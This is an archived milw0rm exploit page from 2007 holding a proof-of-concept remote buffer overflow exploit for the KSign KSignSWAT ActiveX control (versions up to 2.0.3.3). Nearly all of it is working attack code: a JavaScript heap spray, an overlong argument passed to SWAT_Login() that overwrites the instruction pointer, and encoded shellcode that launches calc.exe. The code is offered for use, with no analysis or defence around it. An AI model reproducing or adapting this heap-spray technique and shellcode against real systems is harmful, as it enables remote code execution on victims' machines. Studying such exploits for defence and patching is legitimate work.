<html><head><title>KSign KSignSWAT <= 2.0.3.3 ActiveX Control Remote BoF Exploit</title></head><pre>&lt;!--
///////////////////////////////////////////////////////////////////
// KSignSWAT SWAT_Login() PoC Code.                              //
//                                                               //
// URL : www.ksign.com                                           //
// Author : KIM Kee-hong (l1nefeed@gmail.com)                    //
// Date : 2007/05/13                                             //
// Notice : Tested on WinXP SP2 KOREAN (all patched) with IE 6   //
///////////////////////////////////////////////////////////////////
--&gt;

&lt;html&gt;
&lt;head&gt;
&lt;title&gt; www.ksign.com - KSignSWAT SWAT_Login() PoC code &lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;object ID=&quot;vuln&quot; CLASSID=&quot;clsid:F326007F-DD23-4724-BAFC-B1C97FC18794&quot;&gt;
&lt;/object&gt;
&lt;script language=javascript&gt;


function GetHeapPad(HeapJam, SizeofHeapPad)
{
    while(HeapJam.length*2 &lt; SizeofHeapPad)
    {
         HeapJam +=HeapJam;
    }
    HeapJam = HeapJam.substring(0, SizeofHeapPad/2);
    return HeapJam;
}

// buffer 671 bytes write, then EIP overwrite.

var O5pad=unescape(
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05%05&quot; +
         &quot;%05%05%05%05%05%05%05%05%05%05%05&quot;);

var HeapJamAddr = 0x05050505;

var SizeofHeap = 0x200000;

// calc.exe code.

var calcCode = unescape(
         &quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&quot; +
         &quot;%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F&quot; +
         &quot;%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA&quot; +
         &quot;%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F&quot; +
         &quot;%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78&quot; +
         &quot;%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C&quot; +
         &quot;%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A%uFF57&quot; +
         &quot;%u63E7%u6C61%u0063&quot;);

var SizeofCalc = calcCode.length * 2;
var SizeofHeapPad = SizeofHeap - (SizeofCalc+0x38);
var HeapJam = unescape(&quot;%u0505%u0505&quot;)
HeapJam = GetHeapPad(HeapJam, SizeofHeapPad);
HeapBread = (HeapJamAddr - 0x400000)/SizeofHeap;
mem = new Array();

for(i = 0; i&lt;HeapBread; i++)
{
    mem[i] = HeapJam + calcCode;
}

try
{
    document.all.vuln.SWAT_Login(O5pad);
}catch(e){}

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2007-05-22]</pre></html>